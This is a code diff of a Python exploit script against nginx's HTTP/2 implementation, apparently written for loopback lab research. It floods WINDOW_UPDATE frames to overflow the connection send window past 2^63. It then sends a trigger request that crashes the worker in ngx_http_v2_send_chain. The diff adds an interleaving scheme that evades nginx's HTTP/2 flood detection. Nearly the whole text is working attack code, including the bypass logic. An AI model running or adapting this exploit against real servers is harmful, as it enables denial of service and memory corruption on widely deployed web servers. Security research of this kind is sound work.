@@ -5,8 +5,8 @@ Owner-approved (DM #59): drive h2c->send_window from the proven mkC2
 state (~2x MAX) to >= 2^63 with pure wire traffic — N standalone
 max-increment connection WINDOW_UPDATE frames (13 bytes each),
 pipelined in large batches with no sleeps and no debugger anywhere in
-the loop — then (trigger mode) a fresh GET on stream 71 to run
-ngx_http_v2_send_chain with the pumped ledger: the rung-3 consumer,
+the loop — then (trigger mode) a fresh GET on the next unused stream to
+run ngx_http_v2_send_chain with the pumped ledger: the rung-3 consumer,
 wire-pure.
 
 Bootstrap (phases 0/A/B/C) is byte-identical to wuprobe.py, whose
@@ -14,20 +14,31 @@ ledger arithmetic is gdb-verified (wakes 6/9): after mkC2 the 1.31.8
 guard expression (v2.c:2564) is underflowed and every further WU is
 accepted (v2.c:2575).
 
-Pump I/O is SINGLE-THREADED non-blocking select: the first calibration
-attempt used a reader thread, and concurrent SSL_read + SSL_write on
-one SSL object from two threads produced a spurious send failure (no
-end-marker PONG, empty-str SSL exception). One thread, one state
-machine — no race class at all.
+Flood-guard interleave (the first full attempt died ~42M WUs in):
+nginx's read handler enforces total_bytes/8 <= payload_bytes + 1 MiB
+(v2.c:432) else "http2 flood detected" + GOAWAY close. WU frames add
+13 total_bytes and 0 payload_bytes, so a naive WU flood trips at
+~8*(64 MiB + 1 MiB)/13 ≈ 42.8M frames. payload_bytes also counts
+SERVER-SENT frame lengths at send completion (filter:1538/1633), which
+cost no total_bytes — so the client interleaves a fresh GET /blob per
+BLOB_CYCLE_WUS WUs and drains it fully: each 64 MiB blob buys
+8*64 MiB = 512 MB of client-wire headroom vs 30M WUs = 390 MB spent per
+cycle. INTERLEAVE=0 disables it (diagnostic: preserves the naive wall
+and its exact trip point).
 
-Observability: the client never reads during bootstrap (charges stay
-queued-unsent and refundable, exactly the wuprobe shape); after mkC2
-the pump drains continuously — safe only from that point: the sole
-live charge source is stream 1's 64 MiB blob (bounded, ~7e-12 of the
-pumped ledger). Marker PINGs every MARKER frames; each PONG proves
-the worker parsed and accepted every frame before the marker.
-GOAWAY / EOF / reset / send-stall abort with the frame count
-preserved (honest achieved-multiple record).
+Pump I/O is SINGLE-THREADED non-blocking select (a reader thread +
+concurrent SSL_read/SSL_write on one SSL object is a race class; also
+the first calibration's "end-ping-fail" was a 7-byte marker assert —
+both fixed here).
+
+Observability: no reads during bootstrap (charges stay queued-unsent
+and refundable, exactly the wuprobe shape); after mkC2 the pump
+drains continuously — safe only from that point: the live charge
+sources are stream 1's blob plus the interleave blobs, together
+<= ~9.4 GB of queue-time charges, ~1e-9 of the pumped ledger.
+Marker PINGs every MARKER frames; each PONG proves the worker parsed
+and accepted every frame before the marker. GOAWAY / EOF / reset /
+send-stall abort with the frame count preserved (honest record).
 
 Ledger arithmetic (recorded, not debugger-read):
     R_final = R_C2 + frames_sent * (2^31-1) - drain_charges
@@ -37,7 +48,7 @@ itself (worker abort at the filter:1144 cast), plus the memcpy size
 printed in the worker's ASan report.
 
 Loopback only (127.0.0.1). Usage:
-    wupump.py TOTAL_WUS TRIGGER(0|1) [MARKER_EVERY] [CAP_SECONDS]
+    wupump.py TOTAL_WUS TRIGGER(0|1) [MARKER_EVERY] [CAP_S] [INTERLEAVE]
 """
 import json
 import select
@@ -61,8 +72,11 @@ FT_PING, FT_GOAWAY, FT_WU = 6, 7, 8
 FLAG_ACK, FLAG_END_STREAM, FLAG_END_HEADERS = 0x1, 0x1, 0x4
 RST_CANCEL = 8
 
-TRIGGER_SID = 71                 # first odd sid unused after bootstrap
-BATCH_BYTES = 8 << 20            # pipelined batch (~645k WUs)
+BLOB_BYTES = 67108864            # lab/corpus/blob is exactly 64 MiB
+BLOB_CYCLE_WUS = 30000000        # 390 MB wire per cycle vs 512 MB headroom
+BLOB_FIRST_SID = 73              # bootstrap ends at sid 69; 71 reserved
+BLOB_DRAIN_WAIT = 120           # s to wait for a cycle's blob to complete
+BATCH_BYTES = 8 << 20           # pipelined batch (~645k WUs)
 HEARTBEAT_BATCHES = 64           # progress line every ~512 MB of wire
 DEFAULT_MARKER = 1 << 28         # 16 markers over the full 2^32-WU pump
 DEFAULT_CAP = 21600              # 6 h hard client-side wall-clock cap
@@ -85,7 +99,7 @@ def rst(sid, status=RST_CANCEL):
 
 
 def ping(marker):
-    assert len(marker) == 8
+    assert len(marker) == 8, marker
     return frame(FT_PING, 0, 0, marker)
 
 
@@ -141,11 +155,15 @@ def main():
     marker_every = int(argv[2]) if len(argv) > 2 and argv[2] else \
         DEFAULT_MARKER
     cap_s = int(argv[3]) if len(argv) > 3 and argv[3] else DEFAULT_CAP
+    interleave = True
+    if len(argv) > 4 and argv[4]:
+        interleave = bool(int(argv[4]))
 
     t0 = time.time()
     out = {"argv": argv, "phase": "connect", "r_c2": R_C2,
            "big_wu": BIG_WU, "total": total, "trigger": trigger,
-           "marker_every": marker_every, "cap_s": cap_s}
+           "marker_every": marker_every, "cap_s": cap_s,
+           "interleave": interleave}
 
     def emit(**kw):
         out.update(kw)
@@ -179,7 +197,7 @@ def main():
     tls.sendall(window_update(0, CHUNK))              # refill
     time.sleep(0.5)
     tls.sendall(ping(b"mkA2ping"))
-    tls.sendall(rst(3))                              # refund on top
+    tls.sendall(rst(3))                               # refund on top
     time.sleep(1.5)
     tls.sendall(ping(b"mkA3ping"))                    # A3: R = A2 + 65536
 
@@ -225,7 +243,7 @@ def main():
 
     def send_full(data):
         """Non-blocking full send. True = sent; False = stall or death
-        (details recorded in ps / returned reason)."""
+        (details recorded in ps)."""
         deadline = time.time() + SEND_STALL_TIMEOUT
         mv = memoryview(data)
         off = 0
@@ -251,48 +269,98 @@ def main():
     def server_gone():
         return ps.dead is not None or ps.goaway is not None
 
+    def wait_readable(timeout=0.2):
+        select.select([tls], [], [], timeout)
+
     wu = window_update(0, BIG_WU)                      # 13 bytes
     fpb = BATCH_BYTES // 13
     batch = wu * fpb
     sent, batches, mk, abort_reason = 0, 0, 0, None
     next_marker = marker_every
     pump_t0 = time.time()
+    blob_sid = BLOB_FIRST_SID
+    blobs_opened = 0
 
-    while sent < total:
-        n = min(fpb, total - sent)
-        if not send_full(batch if n == fpb else batch[:n * 13]):
-            abort_reason = "send-stall/dead %s %s" % (ps.dead, ps.goaway)
-            break
-        sent += n
-        batches += 1
-        recv_avail()
-        if server_gone():
-            abort_reason = "server-dead goaway=%s %s" % (ps.goaway, ps.dead)
-            break
-        if sent >= next_marker:
-            mk += 1
-            next_marker += marker_every
-            if not send_full(ping(("WP%06d" % mk).encode())):
-                abort_reason = "marker-send-fail %s %s" % (ps.dead,
+    def pump_batch(bound):
+        """Send up to `bound` WUs in fpb-sized batches, with drain,
+        marker/heartbeat emission and liveness checks between batches.
+        Returns False on abort (abort_reason set) or when `sent`
+        reaches bound... returns True normally."""
+        nonlocal sent, batches, mk, next_marker, abort_reason
+        while sent < bound and abort_reason is None:
+            n = min(fpb, bound - sent)
+            if not send_full(batch if n == fpb else batch[:n * 13]):
+                abort_reason = "send-stall/dead %s %s" % (ps.dead,
                                                           ps.goaway)
-                break
+                return False
+            sent += n
+            batches += 1
             recv_avail()
-            emit(phase="marker", marker=mk, sent=sent,
+            if server_gone():
+                abort_reason = "server-dead goaway=%s %s" % (ps.goaway,
+                                                             ps.dead)
+                return False
+            if sent >= next_marker:
+                mk += 1
+                next_marker += marker_every
+                if not send_full(ping(("WP%06d" % mk).encode())):
+                    abort_reason = "marker-send-fail %s %s" % (ps.dead,
+                                                              ps.goaway)
+                    return False
+                recv_avail()
+                emit(phase="marker", marker=mk, sent=sent,
+                     ledger_est=ledger_est(sent),
+                     rate=round(sent / (time.time() - pump_t0), 1),
+                     drained=ps.data_bytes, frames_in=ps.frames,
+                     goaway=ps.goaway, dead=ps.dead)
+            elif batches % HEARTBEAT_BATCHES == 0:
+                emit(phase="beat", sent=sent, ledger_est=ledger_est(sent),
+                     rate=round(sent / (time.time() - pump_t0), 1),
+                     drained=ps.data_bytes, frames_in=ps.frames,
+                     goaway=ps.goaway, dead=ps.dead)
+            if time.time() - pump_t0 > cap_s:
+                abort_reason = "cap"
+                return False
+        return True
+
+    while sent < total and abort_reason is None:
+        cycle_end = min(sent + BLOB_CYCLE_WUS, total)
+        if interleave:
+            # fresh blob response: +64 MiB payload_bytes when drained,
+            # buying 8*64 MiB of flood-guard headroom for this cycle
+            if not send_full(get_blob(blob_sid)):
+                abort_reason = "blob-open-fail %s %s" % (ps.dead,
+                                                         ps.goaway)
+                break
+            blobs_opened += 1
+            blob_sid += 2
+            cycle_data0 = ps.data_bytes
+        if not pump_batch(cycle_end):
+            break
+        if interleave:
+            # this cycle's blob must fully drain before the next cycle
+            deadline = time.time() + BLOB_DRAIN_WAIT
+            while ps.data_bytes - cycle_data0 < BLOB_BYTES:
+                if server_gone():
+                    abort_reason = "server-dead goaway=%s %s" % (
+                        ps.goaway, ps.dead)
+                    break
+                if time.time() > deadline:
+                    abort_reason = "blob-stall"
+                    break
+                recv_avail()
+                wait_readable(0.2)
+            if abort_reason:
+                break
+            emit(phase="cycle", sent=sent,
                  ledger_est=ledger_est(sent),
                  rate=round(sent / (time.time() - pump_t0), 1),
                  drained=ps.data_bytes, frames_in=ps.frames,
-                 goaway=ps.goaway, dead=ps.dead)
-        elif batches % HEARTBEAT_BATCHES == 0:
-            emit(phase="beat", sent=sent, ledger_est=ledger_est(sent),
-                 rate=round(sent / (time.time() - pump_t0), 1),
-                 drained=ps.data_bytes, frames_in=ps.frames,
-                 goaway=ps.goaway, dead=ps.dead)
-        if time.time() - pump_t0 > cap_s:
-            abort_reason = "cap"
-            break
+                 blob=blobs_opened, goaway=ps.goaway, dead=ps.dead)
 
     # ---- end-of-pump prefix proof ----
     end_marker = b"mkXPping"
+    end_ponged = False
     if not server_gone():
         if send_full(ping(end_marker)):
             deadline = time.time() + END_WAIT
@@ -300,7 +368,7 @@ def main():
                 recv_avail()
                 if ps.ponged(end_marker) or server_gone():
                     break
-                select.select([tls], [], [], 0.2)
+                wait_readable(0.2)
             end_ponged = ps.ponged(end_marker)
         else:
             abort_reason = (abort_reason or "") + \
@@ -309,20 +377,21 @@ def main():
     # ---- trigger: fresh GET runs send_chain with the pumped ledger ----
     triggered = False
     if trigger and abort_reason is None and sent == total:
-        if send_full(get_blob(TRIGGER_SID)):
+        trigger_sid = blob_sid          # next unused odd stream id
+        if send_full(get_blob(trigger_sid)):
             deadline = time.time() + TRIGGER_WAIT
             while time.time() < deadline:
                 recv_avail()
                 if server_gone():
                     break
-                select.select([tls], [], [], 0.2)
+                wait_readable(0.2)
             triggered = ps.dead is not None and ps.goaway is None
 
     emit(phase="done", sent=sent, total=total, abort=abort_reason,
          ledger_est=ledger_est(sent),
          rate=round(sent / (time.time() - pump_t0), 1) if sent else 0,
          elapsed=round(time.time() - t0, 3),
-         end_ponged=end_ponged,
+         end_ponged=end_ponged, blobs_opened=blobs_opened,
          pongs={k.decode(): round(v - t0, 3) for k, v in ps.pongs.items()},
          drained=ps.data_bytes, frames_in=ps.frames,
          goaway=ps.goaway, dead=ps.dead,
